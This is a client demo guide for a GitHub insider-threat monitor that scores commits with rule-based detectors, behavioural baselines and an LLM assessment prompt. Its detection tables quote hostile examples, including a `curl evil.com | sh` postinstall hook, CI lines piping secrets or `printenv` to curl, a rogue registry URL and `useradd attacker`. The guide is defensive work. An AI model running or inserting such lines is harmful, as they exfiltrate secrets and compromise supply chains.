# GitHub Monitor — Client Demo Guide

**Purpose:** A demo-ready explanation of how the GitHub Monitor (Insider Threat Detection) works end-to-end, including the exact AI prompts the system uses. Written for a client-facing walkthrough.

---

## 1. What it is (30-second pitch)

The GitHub Monitor watches your organisation's repositories in real time and scores **every commit** for insider-threat risk. It combines:

1. **10 deterministic rule-based detectors** (code patterns, sensitive files, supply chain tampering, CI/CD sabotage, config weakening)
2. **Per-developer behavioural baselines** (what does "normal" look like for this developer?)
3. **Statistical anomaly detection** (z-score against baseline)
4. **On-demand AI threat assessment** (LLM classifies intent: intentional insider / suspicious / negligent / false positive)

The output is a prioritised feed of commits your security team can actually investigate — not thousands of raw findings.

---

## 2. The problem we're solving

Traditional SAST tools look at code. They miss the *human* signals:

| Signal the SAST misses | What the GitHub Monitor catches |
|---|---|
| A developer commits at 3 AM their first ever night-time commit | Baseline deviation → flagged |
| Someone renames `.env` in `.gitignore` so secrets get tracked | Config-weakening detector → flagged |
| A PR removes `snyk scan` from `.github/workflows/ci.yml` | CI/CD tampering detector → flagged |
| `package.json` suddenly pulls from a random registry URL | Dependency tampering → flagged |
| Commit message says "fix" but touches 800 lines across 40 files | Suspicious-message + large-commit anomaly |
| A dev's risk score jumps from 0.5 to 8.0 on one commit | Risk-spike anomaly |

This is the **insider-threat layer** that lives *on top of* normal SAST.

---

## 3. End-to-end pipeline

```
[Stage 1]  Connect to GitHub  (PAT auth, add repos)
    ↓
[Stage 2]  Commit Scan        (10 deterministic detectors → risk score 0–10)
    ↓
[Stage 3]  Baseline Engine    (rolling 60-commit window per developer)
    ↓
[Stage 4]  Anomaly Detection  (z-score vs baseline → off-hours, size, risk spike)
    ↓
[Stage 5]  AI Threat Assessment  (on-demand, one click in the UI)
```

Stages 1–4 run automatically on every commit. Stage 5 is triggered by the analyst on commits they want to investigate deeper.

---

## 4. Stage 1 — Connect to GitHub

- User stores a GitHub **Personal Access Token (PAT)** in Settings (masked, marked as secret)
- User adds repositories by `owner/repo` name
- A "Scan Now" button pulls the full commit history; afterwards incremental scans only fetch new commits

**Source:** `backend/services/github_client.py` (~150 lines — thin async REST wrapper)

**Key endpoints used:**
- `GET /user` → validate PAT
- `GET /repos/{owner}/{repo}/commits` → list commits
- `GET /repos/{owner}/{repo}/commits/{sha}` → commit detail + files
- `GET /repos/{owner}/{repo}/commits/{sha}` with `Accept: diff` → raw unified diff

---

## 5. Stage 2 — The 10 Detectors (deterministic)

Every commit runs through these in order. **No AI is involved in this stage** — it's deterministic and auditable.

**Source:** `backend/services/commit_analyzer.py`

### 5.1 Metadata signals

Looks at the commit envelope, not the code.

| Signal | Detection | +Score |
|---|---|---|
| `off_hours` | Commit time < 07:00 or ≥ 21:00 UTC | +1.0 |
| `author_committer_mismatch` | Author email ≠ committer email (ignoring `noreply@`) | +1.5 |
| `unsigned_commit` | GPG `verification.verified` is false | +0.5 |
| `force_push` | Caller flags force push | +2.0 |
| `large_deletion` | More than 500 lines deleted | +1.0 |

### 5.2 SAST rules on the diff

The scanner loads every enabled rule from `custom_rules` with `category='insider_threat'` and runs the pattern against every added line (`+`) in the diff. For each match it captures:
- rule name, severity, CWE, OWASP reference
- file path + line number
- matched text (truncated to 200 chars)
- diff snippet (±5 lines, truncated to 1500 chars) — shown in the UI for context

Severity → score contribution:

| Severity | Score |
|---|---|
| Critical | +2.5 per finding |
| High | +1.5 per finding |
| Medium / Low | +0.5 per finding |

### 5.3 Sensitive file detection

Pattern-matches every touched filename.

| Category | Patterns |
|---|---|
| Environment files | `.env`, `.env.*` |
| Secrets | `secret`, `password`, `.htpasswd` |
| SSH keys | `id_rsa`, `id_dsa`, `authorized_keys` |
| Certificates | `.pem`, `.pfx`, `.p12`, `.key` |
| Cloud credentials | `aws_credentials`, `credentials.json`, `token.json` |
| Password stores | `.kdbx`, `keystore`, `truststore` |
| System | `shadow` |

Score: **+1.5 per file, capped at +3.0**. Each hit also creates a row in `github_sensitive_file_alerts` that the analyst can acknowledge.

### 5.4 Binary file detection

Suspicious for source repositories — compiled malware, exfiltration archives, DB dumps.

- Executables: `.exe`, `.dll`, `.so`, `.dylib`, `.bin`, `.msi`, `.app`
- Archives: `.zip`, `.tar`, `.tar.gz`, `.rar`, `.7z`, `.bz2`
- Database dumps: `.sql`, `.sqlite`, `.dump`, `.bak`
- Bytecode: `.class`, `.pyc`, `.o`, `.obj`, `.wasm`

Score: **+1.0 per file, capped at +2.0**.

### 5.5 Dependency tampering (supply chain defence)

Triggers only when a dependency manifest is touched (`package.json`, `requirements.txt`, `go.mod`, `pom.xml`, `Cargo.toml`, etc).

| Pattern | Example |
|---|---|
| Typosquatting | `lod4sh`, `requ3sts`, `crypt0`, `col0rs`, `f4ker`, `event-stream`, `ua-parser-js` |
| Vulnerable version pinning | `log4j 2.0–2.14`, `django <= 2.x`, `lodash 0–3.x` |
| Custom registry | `registry=https://evil.npmjs.org` (anything not npmjs/pypi/rubygems) |
| Post-install script | `"postinstall": "curl evil.com \| sh"` |
| Security dep removed | Removal of `helmet`, `bcrypt`, `bandit`, `snyk`, `eslint-plugin-security`, etc. |

Score: **+1.5**.

### 5.6 CI/CD pipeline tampering

Triggers on changes to `.github/workflows/*.yml`, `Jenkinsfile`, `.gitlab-ci.yml`, `Dockerfile`, `docker-compose.yml`, `.circleci/config.yml`, etc.

| Pattern | Signal |
|---|---|
| Commenting out security tools (`# snyk test`) | `security_scan_disabled` |
| `SKIP_SCAN=true`, `DISABLE_SAST=1` | `security_check_disabled` |
| `--no-verify` on git commands | `hook_bypass` |
| `echo $SECRET_KEY | curl ...` | `secret_exfil_ci` |
| `printenv | curl ...` | `env_dump_ci` |
| `FROM random-registry/image` | `untrusted_base_image` |
| `RUN useradd attacker` | `docker_user_add` |
| `EXPOSE 4444` (high ports) | `port_exposed` |

Removed lines are checked for references to `snyk`, `sonar`, `trivy`, `semgrep`, `bandit`, `brakeman`, `safety`, `gitleaks`, `trufflehog`, `checkov`, `tfsec`, `grype`, `syft`, `cosign`. If any are removed → `security_tool_removed`.

Score: **+1.5 per instance, capped at +3.0**.

### 5.7 Config / permission weakening

Triggers on config files (`.cfg`, `.ini`, `.toml`, `.yaml`, `nginx`, `apache`, `cors`, `.gitignore`, `CODEOWNERS`).

| Pattern | What it catches |
|---|---|
| `Access-Control-Allow-Origin: *` | CORS wildcard |
| `session_timeout = 31536000` | Extended session timeout |
| `MFA = false`, `2fa = disabled` | MFA disabled |
| `require_auth = false` | Auth disabled |
| `rate_limit = false` | Rate limiting removed |
| `DEBUG = true` | Debug enabled in prod |
| `verify_ssl = false` | SSL verification disabled |
| `TLS = 1.0`, `ssl = SSLv3` | Weak TLS |

**Special cases:**
- **`.gitignore`:** if rules for `.env`, `.pem`, `.key`, `secret`, `credential`, `token` are *removed*, previously ignored secrets could now be tracked → `gitignore_sensitive_unignored`.
- **`CODEOWNERS`:** any removed line weakens code-review protection → `codeowner_removed`.

Score: **+1.0 per instance, capped at +2.0**.

### 5.8 Suspicious commit messages

On commits with more than 50 lines changed:
- Empty / near-empty message (`.`, `..`, `ok`) → `suspicious_message:empty`
- Vague single word (`fix`, `update`, `wip`, `tmp`, `stuff`, `asdf`) → `suspicious_message:vague`

Score: **+0.5**.

### 5.9 Final risk score

All signal scores sum up, cap at **10.0**, and map to a level:

| Score | Level | UI colour | Meaning |
|---|---|---|---|
| ≥ 7.0 | Critical | Red | Immediate review required |
| ≥ 4.0 | High | Orange | Priority investigation |
| ≥ 2.0 | Medium | Yellow | Monitor and review |
| ≥ 0.5 | Low | Blue | Informational |
| < 0.5 | Clean | Green | No action |

---

## 6. Stage 3 — Behavioural Baselines

For each developer, a rolling window of their **last 60 commits** is used to compute what "normal" looks like.

**Source:** `backend/services/baseline_engine.py`

| Metric | How it's computed |
|---|---|
| `mean_commit_hour` | Arithmetic mean of UTC hours across the window |
| `std_commit_hour` | Standard deviation (floor = 1.0 to avoid div-by-zero) |
| `typical_hour_start / end` | `mean ± 1.5 × std`, clamped to 0–23 |
| `avg_additions / deletions / files_changed` | Simple mean |
| `p90_additions / p90_deletions` | 90th percentile |
| `avg_risk_score` | Mean of historical risk scores |
| `avg_commits_per_week` | `n / (span_days / 7)` |

### Baseline status

| Status | Commits in window | What anomaly detection can do |
|---|---|---|
| `insufficient` | < 5 | Nothing — no detection yet |
| `partial` | 5–19 | Simple hour-range check only (low severity) |
| `established` | ≥ 20 | Full z-score analysis (medium / high severity) |

**Critical ordering:** when a new commit arrives, we detect anomalies *against the existing baseline first*, **then** update the baseline. Otherwise the anomaly would contaminate the baseline it's compared against.

---

## 7. Stage 4 — Anomaly Detection

| Anomaly | Trigger | Severity |
|---|---|---|
| `off_hours_deviation` (established) | z-score `|hour − mean| / std ≥ 2.0` | medium (z ≥ 2), high (z ≥ 3) |
| `off_hours_deviation` (partial) | hour outside `[typical_start, typical_end]` | low |
| `large_commit_additions` | `additions > 5 × avg_additions` (and avg > 20 lines) | medium (5×–10×), high (> 10×) |
| `large_commit_deletions` | `deletions > 5 × avg_deletions` (and avg > 20 lines) | medium (5×–10×), high (> 10×) |
| `risk_spike` | `risk_score ≥ 2.5` AND `risk_score > 3 × avg_risk_score` | high |

**Example:** a developer who commits mean 13:00 ± 2h → normal window 10–16. A commit at 03:00 gives `z = |3 − 13| / 2 = 5.0` → **high severity**.

---

## 8. Stage 5 — AI Threat Assessment (the LLM step)

This is the **only** place an LLM is called in the pipeline. It runs **on-demand** when an analyst clicks "AI Analyze" on a commit in the UI.

**Source:** `backend/routers/github_monitor.py:1170` (endpoint `POST /api/github-monitor/commits/{scan_id}/ai-analyze`)

### 8.1 Why it exists

Stages 2–4 tell you *what* is unusual. The AI step tells you *what it probably means* in plain English — impact, likely intent, and recommended actions — so an analyst can triage faster.

### 8.2 The exact prompts

The system uses two prompts passed to `chat_completion` with **temperature = 0.3** (low for consistency) and **max_tokens = 1500**.

#### System prompt (fixed)

```
You are a cybersecurity expert specializing in insider threat analysis.
Respond only with valid JSON.
```

#### User prompt (templated per commit)

```
You are a senior application security analyst specializing in insider threat detection.

Analyze the following git commit and provide a structured threat assessment.

## Commit Details
- **Repository**: {repo_full_name}
- **SHA**: {sha[:12]}
- **Author**: {author_name} <{author_email}>
- **Committer**: {committer_name} <{committer_email}>
- **Message**: {commit_message}
- **Committed at**: {committed_at}
- **Risk Score**: {risk_score}/10 ({risk_level})
- **Files changed**: {files_changed} (+{additions} / -{deletions} lines)

## Behavioral Signals
{signal_text}                  ← comma-joined list, e.g. "off_hours, unsigned_commit, sensitive_files:2"

## SAST Findings ({len(findings)} total)
  - [{SEVERITY}] {rule_name} in {file_path} line {line_number}
    Code: `{matched_text[:300]}`
    Rule: {rule_description}  CWE: {cwe}  OWASP: {owasp}
  ... (one block per finding)

## Sensitive Files Touched ({len(sensitive_files)} total)
  - {file_path} (matched pattern: {pattern_matched})
  ... (one line per alert)

---

Respond ONLY with a valid JSON object (no markdown fences) matching this schema:
{
  "threat_level": "intentional_insider" | "suspicious" | "negligent" | "false_positive",
  "confidence": 0.0-1.0,
  "impact_summary": "2-3 sentence description of the real-world security impact",
  "intent_analysis": "2-3 sentence analysis of whether this looks intentional, accidental, or benign",
  "malicious_scenario": "If this were malicious, describe the most likely attack scenario in 2-3 sentences. Write null if confidence < 0.3.",
  "key_indicators": ["indicator 1", "indicator 2", ...],
  "recommended_actions": ["action 1", "action 2", ...]
}
```

### 8.3 What the AI returns

A strict JSON object that is parsed and stored in `github_commit_ai_analysis`:

| Field | Meaning |
|---|---|
| `threat_level` | One of 4 classes (see table below) |
| `confidence` | 0.0–1.0 — how sure the model is |
| `impact_summary` | Human-readable business impact (2–3 sentences) |
| `intent_analysis` | Intentional vs accidental analysis |
| `malicious_scenario` | Hypothetical attack chain, or `null` if low confidence |
| `key_indicators` | Bullet list of the specific signals that drove the verdict |
| `recommended_actions` | What the analyst should do next |

### 8.4 Threat levels

| Level | Meaning | Typical indicators |
|---|---|---|
| `intentional_insider` | Deliberate malicious action | Secret exfiltration, backdoor, security control bypass |
| `suspicious` | Warrants investigation, intent unclear | Unusual patterns, risky changes |
| `negligent` | Unintentional risk from poor practice | Hardcoded creds, debug code in prod |
| `false_positive` | Benign, flagged in error | Test fixtures, docs, legitimate config |

### 8.5 Why this design works for clients

- **Deterministic first, AI second.** The risk score the client sees is 100% reproducible and auditable — it doesn't depend on LLM weather. The AI only adds *narrative* on top.
- **One call per investigation, not per commit.** The AI step is triggered manually, so cost and latency stay predictable.
- **Results are cached.** `github_commit_ai_analysis` has a unique index on `scan_id`, so repeated clicks don't re-bill the LLM.
- **Provider-agnostic.** Uses the platform's shared `AIConfig.from_user()` / `get_ai_client()` — works with OpenAI, Anthropic, Azure, etc. The model used is recorded for audit.

---

## 9. What the analyst sees

The dashboard has 8 tabs. For the demo, focus on these four:

| Tab | What to show |
|---|---|
| **Overview** | Per-repo risk cards with stacked distribution bars. Peak / avg risk score. Open alert counts. |
| **Commit Feed** | Paginated, filterable feed. Click any row → expandable panel with findings, sensitive files, the diff snippet, and the "AI Analyze" button. |
| **Developers** | Per-developer risk profile. Expand to see the behavioural baseline (typical hours, avg size, avg risk) and their anomaly history. |
| **Anomalies** | All behavioural anomalies across everyone. Filter by severity. Ack workflow. |

Additional tabs: **Timeline** (14-day heat map), **Alerts** (sensitive-file acks), **Findings** (CSV export for compliance), **Repos** (add/remove).

False positives can be dismissed at finding level or commit level — the risk level recalculates from remaining non-FP findings.

---

## 10. Suggested demo script (10–12 minutes)

Keep each step tight.

| # | Step | What to say | What to click |
|---|---|---|---|
| 1 | **Hook** (30 s) | "Traditional SAST misses the human signals. We watch commits for insider-threat patterns in addition to vulnerabilities." | Show Overview tab. |
| 2 | **Setup** (1 min) | "Connection is a single GitHub PAT. Add a repo by name. We do the rest." | Settings → show masked PAT. Repos tab → show the monitored list. |
| 3 | **The 10 detectors** (2 min) | "Every commit runs through 10 deterministic detectors — no AI, fully auditable." | Open a *critical* commit in the feed. Walk through the signals chip row (off-hours, sensitive files, CI/CD tampering). |
| 4 | **Diff evidence** (1 min) | "We don't just say 'bad' — we show you the exact line and ±5 lines of context." | Expand a finding, show the diff snippet and CWE/OWASP mapping. |
| 5 | **Baselines** (2 min) | "Static rules miss behaviour. We also learn each developer's normal." | Developers tab → expand a dev → show typical hours, avg size, avg risk. |
| 6 | **Anomaly** (1 min) | "When someone deviates, we flag it — and we show *why* against the baseline." | Anomalies tab → point at an `off_hours_deviation` row: "mean 13:00 ± 2h, they committed at 03:00, z-score 5." |
| 7 | **AI analyst** (2 min) | "On any suspicious commit, one click gives a full analyst narrative: impact, intent, attack scenario, recommended actions." | Click **AI Analyze** on the critical commit. Read out the `impact_summary` and `malicious_scenario`. Show the key indicators and recommended actions. |
| 8 | **Export** (30 s) | "Everything exports — findings CSV for compliance, full audit trail of AI decisions per commit." | Findings tab → Export CSV. |
| 9 | **Close** | "Deterministic scoring → reproducible & auditable. AI only adds narrative. Provider-agnostic. Cached per commit." | — |

---

## 11. Likely client questions & short answers

| Question | Answer |
|---|---|
| *Does this replace SAST?* | No — it's a layer on top. Your existing SAST rules still run; we also run the `insider_threat` rule category against every commit diff. |
| *How do you avoid false positives?* | Three ways: deterministic rules have per-signal caps so a single noisy commit can't dominate; developers have individual baselines so "normal for them" isn't flagged; every finding and commit can be marked FP and recalculated. |
| *Which LLM do you use?* | Whatever the customer configures. We use a shared AI factory — OpenAI, Anthropic, Azure OpenAI, etc. Model is recorded per analysis for audit. |
| *Can your AI hallucinate a threat?* | The AI never assigns the risk score — that's deterministic from the rules. The AI only writes narrative *after* a human clicks "analyze." Temperature is 0.3 and the response is JSON-validated. |
| *What's the latency?* | Deterministic scan: < 1 second per commit. AI step: 3–8 seconds depending on provider; cached per commit after that. |
| *What if a developer leaves mid-window?* | Baseline window is rolling over their last 60 commits. When they stop committing, the baseline freezes; old anomalies remain on record. |
| *How do you handle force pushes and rewritten history?* | Each commit SHA is scanned once (unique index). Force push is a scorable signal when known by the caller. |
| *What data leaves our network?* | GitHub API calls (diff, metadata) from our backend. The AI step sends the commit summary + findings text to the configured LLM provider — this is the only outbound step and it is opt-in per commit. |
| *Can we add our own rules?* | Yes. The SAST layer reads from `custom_rules` with `category='insider_threat'`. New rules are live immediately, no redeploy. |
| *What does it cost to run?* | Deterministic stages: just GitHub API quota (no LLM). AI stage: one LLM call per analyst-triggered investigation, cached afterwards. |

---

## 12. Technical appendix — file map

| File | Purpose |
|---|---|
| [backend/routers/github_monitor.py](../backend/routers/github_monitor.py) | All API endpoints, scan orchestration, AI prompt (line 1242) |
| [backend/services/github_client.py](../backend/services/github_client.py) | Async GitHub REST client |
| [backend/services/commit_analyzer.py](../backend/services/commit_analyzer.py) | 10-detector risk scoring engine |
| [backend/services/baseline_engine.py](../backend/services/baseline_engine.py) | Behavioural baselines + anomaly detection |
| [frontend/src/pages/GitHubMonitorPage.tsx](../frontend/src/pages/GitHubMonitorPage.tsx) | 8-tab dashboard UI |

**Database tables:**
`github_monitored_repos`, `github_commit_scans`, `github_commit_findings`, `github_sensitive_file_alerts`, `github_developer_profiles`, `github_developer_baselines`, `github_developer_anomalies`, `github_commit_ai_analysis`.
